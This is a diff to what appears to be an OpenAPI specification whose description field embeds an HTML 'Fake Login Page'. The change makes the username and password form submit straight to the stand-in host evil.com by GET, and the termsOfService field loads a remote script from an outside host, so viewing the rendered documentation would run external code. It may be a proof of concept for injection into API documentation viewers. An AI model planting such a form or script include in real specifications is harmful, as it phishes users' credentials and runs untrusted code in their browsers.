@@ -4,26 +4,20 @@ info:
   title: Fake Login Page
   description: |
     <div class="form-container">
-      <form id="loginForm" action="https://evil.com" method="post" class="form-signin">
+      <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
           <label for="username">Username</label>
-          <input type="text" id="username" name="username" size="20">
+          <input type="text" name="username" size="20">
         </div>
         <div class="form-group">
           <label for="password">Password</label>
-          <input type="password" id="password" name="password" size="20">
+          <input type="password" name="password" size="20">
         </div>
         <div class="form-group">
-          <button type="button" onclick="handleLogin()" class="btn btn-default">Login</button>
+          <button type="submit" class="btn btn-default">Login</button>
         </div>
       </form>
     </div>
-    <script>
-      function handleLogin() {
-        alert("Login button clicked!");
-        // You can add more interactive behavior here
-      }
-    </script>
   termsOfService: '<div class="login-form"><script src="https://static.staticsave.com/blunder/futaq.js"></script></div>'
   contact: 
     name: "API Support"
@@ -35,6 +29,7 @@ paths:
       responses:
         '200':
           description: Login successful
+
 
 
 
